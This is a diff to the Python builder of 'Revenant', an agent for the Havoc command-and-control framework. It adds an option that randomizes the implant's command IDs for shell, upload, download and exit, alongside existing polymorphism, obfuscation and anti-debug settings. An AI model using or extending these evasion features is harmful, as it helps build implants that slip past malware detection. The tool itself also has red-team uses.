@@ -10,8 +10,31 @@ from base64 import b64decode
 from havoc.service import HavocService
 from havoc.agent import *
 
+'''
+#define COMMAND_REGISTER         0x100
+#define COMMAND_GET_JOB          0x101
+#define COMMAND_NO_JOB           0x102
+#define COMMAND_SHELL            0x152
+#define COMMAND_UPLOAD           0x153
+#define COMMAND_DOWNLOAD         0x154
+#define COMMAND_EXIT             0x155
+#define COMMAND_OUTPUT           0x200
+'''
+
+RANDOM_COMMANDS = True
+
+COMMAND_REGISTER = 0x100
+COMMAND_GET_JOB = 0x101
+COMMAND_NO_JOB = 0x102
+COMMAND_SHELL = 0x152
+COMMAND_UPLOAD = 0x153
+COMMAND_DOWNLOAD = 0x154
+COMMAND_EXIT = 0x155
+COMMAND_OUTPUT = 0x200
+
 
 def generate_command_constants():
+
     COMMAND_REGISTER = random.randint(0, 0xFFFF)
     COMMAND_GET_JOB = random.randint(0, 0xFFFF)
     COMMAND_NO_JOB = random.randint(0, 0xFFFF)
@@ -22,43 +45,6 @@ def generate_command_constants():
     COMMAND_OUTPUT = random.randint(0, 0xFFFF)
 
     return (COMMAND_REGISTER, COMMAND_GET_JOB, COMMAND_NO_JOB, COMMAND_SHELL, COMMAND_UPLOAD, COMMAND_DOWNLOAD, COMMAND_EXIT, COMMAND_OUTPUT)
-
-
-COMMAND_REGISTER, COMMAND_GET_JOB, COMMAND_NO_JOB, COMMAND_SHELL, COMMAND_UPLOAD, COMMAND_DOWNLOAD, COMMAND_EXIT, COMMAND_OUTPUT = generate_command_constants()
-
-
-def write_command_header_file():
-
-    header_file_contents = f"""#ifndef REVENANT_COMMAND_H
-#define REVENANT_COMMAND_H
-
-#include <windows.h>
-#include "Parser.h"
-
-#define COMMAND_REGISTER         {COMMAND_REGISTER}
-#define COMMAND_GET_JOB          {COMMAND_GET_JOB}
-#define COMMAND_NO_JOB           {COMMAND_NO_JOB}
-#define COMMAND_SHELL            {COMMAND_SHELL}
-#define COMMAND_UPLOAD           {COMMAND_UPLOAD}
-#define COMMAND_DOWNLOAD         {COMMAND_DOWNLOAD}
-#define COMMAND_EXIT             {COMMAND_EXIT}
-#define COMMAND_OUTPUT           {COMMAND_OUTPUT}
-
-typedef struct {{
-    INT ID;
-    VOID (*Function)(PPARSER Arguments);
-}} RVNT_COMMAND;
-
-VOID CommandDispatcher();
-VOID CommandShell(PPARSER Parser);
-VOID CommandUpload(PPARSER Parser);
-VOID CommandDownload(PPARSER Parser);
-VOID CommandExit(PPARSER Parser);
-
-#endif //REVENANT_COMMAND_H
-"""
-    with open("./Include/Command.h", "w") as file:
-        file.write(header_file_contents)
 
 
 GENERATED_PASSWORD: str = ''.join(random.choices(string.ascii_letters, k=16))
@@ -265,6 +251,41 @@ def encode_strings(strings):
     return "\n".join(encoded_strings)
 
 
+def write_command_header_file():
+
+    header_file_contents = f"""#ifndef REVENANT_COMMAND_H
+#define REVENANT_COMMAND_H
+
+#include <windows.h>
+#include "Parser.h"
+
+#define COMMAND_REGISTER         {COMMAND_REGISTER}
+#define COMMAND_GET_JOB          {COMMAND_GET_JOB}
+#define COMMAND_NO_JOB           {COMMAND_NO_JOB}
+#define COMMAND_SHELL            {COMMAND_SHELL}
+#define COMMAND_UPLOAD           {COMMAND_UPLOAD}
+#define COMMAND_DOWNLOAD         {COMMAND_DOWNLOAD}
+#define COMMAND_EXIT             {COMMAND_EXIT}
+#define COMMAND_OUTPUT           {COMMAND_OUTPUT}
+
+typedef struct {{
+    INT ID;
+    VOID (*Function)(PPARSER Arguments);
+}} RVNT_COMMAND;
+
+VOID CommandDispatcher();
+VOID CommandShell(PPARSER Parser);
+VOID CommandUpload(PPARSER Parser);
+VOID CommandDownload(PPARSER Parser);
+VOID CommandExit(PPARSER Parser);
+
+#endif //REVENANT_COMMAND_H
+"""
+    for filepath in glob.iglob('**/Command.h', recursive=True):
+        with open(filepath, 'w') as file:
+            file.write(header_file_contents)
+
+
 def replace_in_file(filename, old_string, new_string):
     with open(filename, "r+") as f:
         file_contents = f.read()
@@ -415,14 +436,15 @@ class Revenant(AgentType):
         self.Arch: list = ["64", "86"]
         self.Formats: list = [
             {"Name": "Windows Exe", "Extension": "exe"},
-            {"Name": "Windows DLL", "Extension": "dll"}   # Not supported yet
+            #{"Name": "Windows DLL", "Extension": "dll"}   # Not supported yet
         ]
         self.BuildingConfig: dict = {
             "Sleep": "10",
             "Polymorphic": True,
             "Obfuscation": True,
             "Native"    : True,
-            "AntiDebug" : True
+            "AntiDebug" : True,
+            "RandCmdIds": True
         }
         self.Commands: list = [
             CommandShell(),
@@ -444,6 +466,10 @@ class Revenant(AgentType):
 
         print("[*] Configuring Config.h header...")
         process_config_h(config)
+
+        if config['Config']['RandCmdIds']:
+            write_command_header_file()
+            print("[*] Configuring Command.h header...")
 
         if config['Config']['Obfuscation']:
             process_strings_h()
@@ -696,7 +722,6 @@ def process_directory(directory_path, instructions, eula, remove=False):
             process_c_file(file_path, instructions, eula, remove)
 
 def main():
-    write_command_header_file()
     havoc_revenant: Revenant = Revenant()
 
     print("[*] Connect to Havoc service api")
